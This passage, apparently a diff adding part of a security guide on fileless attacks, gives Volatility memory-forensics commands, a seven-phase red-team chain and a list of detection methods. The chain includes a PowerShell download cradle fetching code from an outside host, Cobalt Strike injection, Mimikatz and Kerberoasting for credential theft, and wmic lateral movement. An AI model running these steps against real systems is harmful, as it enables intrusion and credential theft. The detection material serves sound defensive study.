+5. Anti-forensics in kernel memory (if attacker has kernel access)
+Volatility Analysis of Fileless Attacks
+# Volatility 3 commands for analyzing fileless malware
+
+# Find injected code (unbacked executable memory)
+vol3 -f memory.dmp windows.malfind
+
+# List all process memory mappings
+vol3 -f memory.dmp windows.memmap --pid 1234
+
+# Dump process memory for analysis
+vol3 -f memory.dmp windows.pslist --dump --pid 1234
+
+# Find loaded .NET assemblies
+vol3 -f memory.dmp windows.modules  # Look for CLR-related modules
+
+# Network connections (find C2)
+vol3 -f memory.dmp windows.netscan
+
+# Search for strings (URLs, IPs, commands)
+vol3 -f memory.dmp windows.strings --pid 1234
+
+# Registry analysis (find registry-resident payloads)
+vol3 -f memory.dmp windows.registry.printkey --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+
+# WMI analysis
+vol3 -f memory.dmp windows.wmi  # Analyze WMI subscriptions
+Building Fileless Attack Chains
+Complete Fileless Red Team Operation
+PHASE 1: INITIAL ACCESS
+========================
+Delivery: Spearphishing email with Office document (macro)
+Macro Action: PowerShell download cradle (no file drop)
+  -> IEX (New-Object Net.WebClient).DownloadString('https://cdn.updates.com/config.js')
+
+PHASE 2: EXECUTION & IMPLANT
+==============================
+Downloaded Script: Contains shellcode loader
+  -> Shellcode downloaded as encrypted byte array
+  -> Decrypted in memory
+  -> Injected into RuntimeBroker.exe via Early Bird APC
+  -> Reflective DLL loads Cobalt Strike Beacon
+  -> Beacon communicates over HTTPS (domain fronting)
+  NO FILES ON DISK
+
+PHASE 3: PERSISTENCE
+======================
+Method: WMI Event Subscription
+  -> Filter: __InstanceModificationEvent on system uptime
+  -> Consumer: CommandLineEventConsumer with encoded PowerShell
+  -> PowerShell reads encrypted stager from registry value
+  -> Registry value: HKCU\SOFTWARE\Microsoft\Windows\ShellNoRoam\MUICache
+  NO FILES ON DISK (persistence is in WMI repository + registry)
+
+PHASE 4: PRIVILEGE ESCALATION
+==============================
+Method: In-memory Rubeus (Kerberoasting)
+  -> execute-assembly Rubeus.exe kerberoast
+  -> Crack service ticket offline
+  -> OR: In-memory SharpUp for local privesc checks
+  NO FILES ON DISK
+
+PHASE 5: CREDENTIAL HARVESTING
+================================
+Method: BOF for LSASS minidump + in-memory parsing
+  -> Or: In-memory Mimikatz via execute-assembly
+  -> Credentials stored in Beacon's memory
+  NO FILES ON DISK
+
+PHASE 6: LATERAL MOVEMENT
+===========================
+Method: WMI + PowerShell download cradle
+  -> wmic /node:TARGET process call create "powershell -enc ..."
+  -> New target downloads and executes shellcode in-memory
+  -> New Beacon deployed via reflective injection
+  NO FILES ON DISK
+
+PHASE 7: DATA COLLECTION & EXFILTRATION
+=========================================
+Method: In-memory data collection
+  -> BOFs for file searching and reading
+  -> Data compressed and encrypted in memory
+  -> Exfiltrated over C2 channel (HTTPS)
+  NO FILES ON DISK
+OPSEC Advantages and Limitations
+What Fileless Buys You
+ADVANTAGES:
+============
+1. Evades file-based AV scanning (no file to scan)
+2. Evades application whitelisting (using trusted LOLBins)
+3. Reduces disk forensic artifacts (no PE files, no file hashes)
+4. Survives standard incident response file sweeps
+5. No file hashes for threat intel matching
+6. Reduced ShimCache/AmCache/Prefetch entries for custom tools
+
+LIMITATIONS (WHAT FILELESS DOES NOT SOLVE):
+=============================================
+1. Process creation is still logged (Event 4688, Sysmon 1)
+2. PowerShell ScriptBlock Logging captures decoded scripts
+3. ETW captures .NET assembly loads, API calls
+4. Network traffic is still visible (NDR, proxy logs)
+5. Memory is still scannable (EDR, memory forensics)
+6. WMI subscriptions are logged (Sysmon 19/20/21)
+7. Command-line arguments are logged (even for LOLBins)
+8. Parent-child process relationships are suspicious
+   (winword.exe -> powershell.exe -> rundll32.exe)
+9. Named pipes for C2 are enumerable
+10. AMSI scans PowerShell content regardless of origin
+Detection Mechanisms
+PowerShell Logging
+POWERSHELL LOGGING (Primary fileless detection):
+=================================================
+
+1. Script Block Logging (Event 4104):
+   - Logs the DEOBFUSCATED content of every script block executed
+   - Captures downloaded-and-executed content
+   - Even encoded/obfuscated scripts are logged AFTER deobfuscation
+   - Location: Microsoft-Windows-PowerShell/Operational
+   - This is the #1 detection for PowerShell-based fileless attacks
+
+2. Module Logging (Event 4103):
+   - Logs pipeline execution details
+   - Captures cmdlet names, parameters, output
+   - Less detailed than ScriptBlock but broader coverage
+
+3. Transcription:
+   - Full text recording of PowerShell sessions
+   - Captures input and output
+   - Saved to configured directory (often missed by attackers)
+   - Location: Configured via GPO or registry
+
+4. Constrained Language Mode (Prevention):
+   - Restricts PowerShell capabilities
+   - Blocks .NET access, COM objects, Add-Type
+   - Significantly limits fileless PowerShell techniques
+ETW-Based Detection
+ETW PROVIDERS FOR FILELESS DETECTION:
+========================================
+
+Microsoft-Windows-DotNETRuntime:
+  - AssemblyLoad events (detect in-memory .NET loading)
+  - JIT compilation events
+  - AppDomain creation
+  - Method JIT compilation (what code is being compiled)
+
+Microsoft-Windows-PowerShell:
+  - Script block execution
+  - Provider lifecycle
+
+Microsoft-Windows-WMI-Activity:
+  - WMI query execution
+  - WMI event subscription creation
+  - WMI method invocation
+
+Microsoft-Windows-Threat-Intelligence:
+  - VirtualAlloc with EXECUTE permissions
+  - Remote memory operations (WriteProcessMemory)
+  - APC queueing (thread injection)
+  - Requires PPL (Protected Process Light) to consume
+
+DETECTION LOGIC:
+  IF: Non-.NET process loads clr.dll
+  AND: Assembly.Load called with byte array
+  AND: No corresponding file on disk
+  THEN: High confidence in-memory .NET execution (fileless)
+Behavioral Detection
+BEHAVIORAL INDICATORS:
+========================
+
+1. PROCESS CHAIN ANOMALIES:
+   winword.exe -> cmd.exe -> powershell.exe     (macro execution)
+   mshta.exe -> powershell.exe                  (HTA fileless)
+   wmic.exe -> powershell.exe                   (WMI fileless)
+   rundll32.exe -> powershell.exe               (LOLBin chain)
+
+2. ENCODED COMMAND DETECTION:
+   powershell.exe -enc <long_base64_string>
+   powershell.exe -e <long_base64_string>
+   Any -EncodedCommand with significant length
+
+3. DOWNLOAD CRADLE PATTERNS:
+   Process command line containing:
+   - "IEX" or "Invoke-Expression"
+   - "Net.WebClient" or "DownloadString"
+   - "Invoke-WebRequest" or "IWR"
+   - "WinHttp.WinHttpRequest"
+
+4. LOLBin MISUSE:
+   certutil.exe with -urlcache
+   mshta.exe with http:// or javascript:
+   regsvr32.exe with /i:http://
+   msbuild.exe from unexpected directory
+Real-World Campaigns
+Notable Fileless Campaigns
+OPERATION COBALT KITTY (APT32/OceanLotus - 2017):
+  - PowerShell download cradles for initial access
+  - WMI event subscriptions for persistence
+  - Registry-stored encoded payloads
+  - Entire attack chain was fileless after initial macro
+
+ASTAROTH CAMPAIGN (2019):
+  - Used BITSAdmin for download (LOLBin)
+  - ExtExport.exe for DLL side-loading (LOLBin)
+  - Payload stored in ADS of legitimate files
+  - WMI for persistence
+  - Minimal file footprint
+
+POWERGHOST CRYPTOMINER (2018):
+  - Fileless cryptocurrency miner
+  - Spread via EternalBlue + WMI
+  - Payload stored in WMI repository
+  - No miner executable on disk
+  - PowerShell for all operations
+
+FIN7/CARBANAK (Multiple campaigns):
+  - Macro -> PowerShell -> reflective DLL injection
+  - Cobalt Strike Beacon loaded entirely in memory
+  - WMI for lateral movement
+  - Registry for payload storage
+
+TURLA (2019 - PowerShell-based operations):
+  - PowerShell scripts hosted on compromised websites
+  - Download cradles with heavy obfuscation
+  - .NET assemblies loaded in-memory
+  - WMI event subscriptions for persistence
 The above copyright notice and this permission notice shall be included in all
 copies or substantial portions of the Software.
 
